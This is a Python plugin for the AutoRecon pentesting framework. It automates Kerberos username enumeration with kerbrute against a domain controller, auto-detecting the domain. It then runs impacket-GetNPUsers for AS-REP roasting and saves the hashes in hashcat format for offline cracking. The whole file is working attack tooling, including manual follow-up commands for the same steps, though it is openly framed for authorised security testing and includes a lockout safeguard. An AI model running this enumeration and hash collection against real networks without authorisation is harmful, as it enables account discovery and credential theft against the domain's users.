from autorecon.plugins import ServiceScan
from autorecon.config import config
from shutil import which
import os, re

# Local addition 2026-11-04. Kerberos username enumeration with kerbrute (AS-REQ without
# pre-authentication data): tells which usernames exist without trying any password, so it does
# not add to badPwdCount; it does create 4768 events on the DC. --safe aborts if an account is
# reported locked. Domain: --global.domain, else LDAP RootDSE, else the NetExec SMB banner.
# Overlap with stock: nmap-kerberos runs krb5-enum-users only when --global.domain is given and
# with a short built-in list. This plugin adds: domain auto-detection, a large wordlist, --safe,
# a reusable valid-user list, and an AS-REP check (impacket-GetNPUsers -no-pass, one request
# per confirmed user, no password) - stock AutoRecon has no AS-REP check.
# Output: *_kerbrute_userenum.txt, kerberos_valid_users.txt (one name per line),
#         kerberos_asrep_hashes.txt (hashcat mode 18200) when an account has no pre-auth.

def domain_from_rootdse(lines):
	for l in lines:
		m = re.match(r'^\s*defaultNamingContext:\s*(DC=.+?)\s*$', l, re.I)
		if m:
			return '.'.join(p.split('=', 1)[1] for p in m.group(1).split(',') if p.upper().startswith('DC='))
	return None

def domain_from_nxc(lines):
	for l in lines:
		m = re.search(r'\(domain:([A-Za-z0-9.-]+\.[A-Za-z]{2,})\)', l)
		if m:
			return m.group(1)
	return None

def valid_users(text):
	users = []
	for m in re.finditer(r'VALID USERNAME:\s+(\S+?)@', text):
		if m.group(1) not in users:
			users.append(m.group(1))
	return users

def asrep_hashes(text):
	return list(dict.fromkeys(re.findall(r'(\$krb5asrep\$\S+)', text)))

class KerberosUserEnum(ServiceScan):

	def __init__(self):
		super().__init__()
		self.name = 'Kerberos User Enumeration'
		self.tags = ['default', 'safe', 'kerberos', 'active-directory', 'local-addition']

	def configure(self):
		self.add_option('wordlist', default='/usr/share/seclists/Usernames/Names/names.txt', help='Usernames to test. Default: %(default)s')
		self.add_option('threads', default='10', help='kerbrute threads. Default: %(default)s')
		self.match_service_name(['^kerberos', '^kerberos-sec'])
		self.run_once(True)

	def check(self):
		if which('kerbrute') is None:
			self.error('kerbrute not found in PATH (https://github.com/ropnop/kerbrute).')
			return False

	def manual(self, service, plugin_was_run):
		service.add_manual_commands('Kerberos follow-ups (the AS-REP check already ran on the kerbrute users; rerun with names from LDAP/RID cycling):', [
			'impacket-GetNPUsers DOMAIN/ -dc-ip {address} -usersfile users.txt -no-pass -format hashcat -outputfile asrep.txt',
			'kerbrute userenum -d DOMAIN --dc {address} --safe /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt   # larger list',
		])

	async def run(self, service):
		target = service.target
		domain = self.get_global('domain', default=None)
		if not domain:
			_, out, _ = await service.execute('ldapsearch -x -o nettimeout=8 -H ldap://{address}:389 -s base -b "" defaultNamingContext 2>&1', outfile='{protocol}_{port}_kerberos_domain_rootdse.txt')
			domain = domain_from_rootdse(await out.readlines())
		if not domain and which('nxc'):
			_, out, _ = await service.execute('nxc smb {address} 2>&1', outfile='{protocol}_{port}_kerberos_domain_nxc.txt')
			domain = domain_from_nxc(await out.readlines())
		if not domain or not re.fullmatch(r'[A-Za-z0-9.-]+\.[A-Za-z]{2,}', domain):
			service.error('Kerberos user enumeration skipped: domain unknown. Rerun with --global.domain corp.local')
			return
		wordlist = self.get_option('wordlist')
		threads = str(int(self.get_option('threads')))
		_, out, _ = await service.execute('kerbrute userenum -d ' + domain + ' --dc {address} --safe -t ' + threads + ' ' + wordlist + ' 2>&1', outfile='{protocol}_{port}_kerbrute_userenum.txt')
		text = '\n'.join(await out.readlines())
		users = valid_users(text)
		scandir = target.scandir if config['no_port_dirs'] else os.path.join(target.scandir, service.protocol + str(service.port))
		with open(os.path.join(scandir, 'kerberos_valid_users.txt'), 'w') as fh:
			fh.write('\n'.join(users) + ('\n' if users else ''))
		hashes = []
		npu = which('impacket-GetNPUsers') or which('GetNPUsers.py')
		if users and npu:
			_, out, _ = await service.execute(os.path.basename(npu) + ' ' + domain + '/ -dc-ip {address} -no-pass -format hashcat -usersfile "' + os.path.join(scandir, 'kerberos_valid_users.txt') + '" 2>&1', outfile='{protocol}_{port}_kerberos_asrep_check.txt')
			hashes = asrep_hashes('\n'.join(await out.readlines()))
		if hashes:
			with open(os.path.join(scandir, 'kerberos_asrep_hashes.txt'), 'w') as fh:
				fh.write('\n'.join(hashes) + '\n')
			service.info('{bred}Kerberos: ' + str(len(hashes)) + ' account(s) without pre-authentication{rst} -> kerberos_asrep_hashes.txt (hashcat -m 18200)')
		service.info('{byellow}Kerberos: ' + str(len(users)) + ' valid usernames{rst} for ' + domain)
